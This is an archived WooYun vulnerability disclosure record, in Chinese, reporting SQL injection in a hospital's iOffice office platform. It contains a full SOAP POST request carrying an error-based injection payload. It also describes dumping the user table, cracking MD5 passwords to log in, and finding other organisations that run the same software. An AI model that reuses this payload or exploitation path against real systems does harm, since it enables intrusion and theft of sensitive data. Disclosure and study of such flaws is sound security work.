{"id": 79689, "wybug_id": "wooyun-2015-0157561", "wybug_title": "广州医科大学附属第二医院办公平台存在SQL注入漏洞", "wybug_corp": "广州医科大学附属第二医院", "wybug_author": "Hedgehog", "wybug_date": "2015-12-03 21:31", "wybug_open_date": "2016-01-22 11:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(广东省信息安全测评中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-22：\t细节向公众公开  简要描述：  详细说明：  广州医科大学附属第二医院办公平台为广州红帆电脑科技有限公司开发的iOffice办公平台，该OA平台可通过webservice提交xml数据进行POST注入，获取数据表，且数据库账户为管理员账户。百度inurl:ioffice查了一下用红帆iOffice办公平台的还有浙江欧华造船有限公司、中铁十三局集团第二工程有限公司、广东雅士利集团有限公司。注入点：http://**.**.**.**/ioffice/prg/set/wss/ioCtlSet.asmxpost数据：\nPOST /ioffice/prg/set/wss/ioCtlSet.asmx HTTP/1.1Cache-Control: no-cacheAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 NetsparkerSOAPAction: \"http://**.**.**.**/SignOut\"Accept-Language: en-us,en;q=0.5X-Scanner: NetsparkerHost: **.**.**.**Accept-Encoding: gzip, deflateContent-Length: 496Content-Type: text/xml; charset=utf-8<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://**.**.**.**/soap/envelope/\" xmlns:xsi=\"http://**.**.**.**/2001/XMLSchema-instance\" xmlns:xsd=\"http://**.**.**.**/2001/XMLSchema\">  <soap:Body>    <SignOut xmlns=\"http://**.**.**.**/\">      <SessionID>'+ (select convert(int,CHAR(95)+CHAR(33)+CHAR(64)+CHAR(50)+CHAR(100)+CHAR(105)+CHAR(108)+CHAR(101)+CHAR(109)+CHAR(109)+CHAR(97)) FROM syscolumns) +'</SessionID>    </SignOut>  </soap:Body></soap:Envelope>\n   漏洞证明：  \n\n数据库账户为管理员账户\n\n找到用户表\n\n\n\n密码为MD5加密，随便找个用户破解登录\n\n\n\n跟领导们说些什么呢\n\n还可以看到其它一些信息\n\n\n\n进一步的渗透就不做了，相信你们懂的。   修复方案：  对SessionID进行过滤过滤   版权声明：转载请注明来源 Hedgehog@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-08 14:41 厂商回复： 非常感谢您的报告。报告中的问题已确认并复现.影响的数据：高攻击成本：低造成影响：高综合评级为：高，rank：10正在联系相关网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}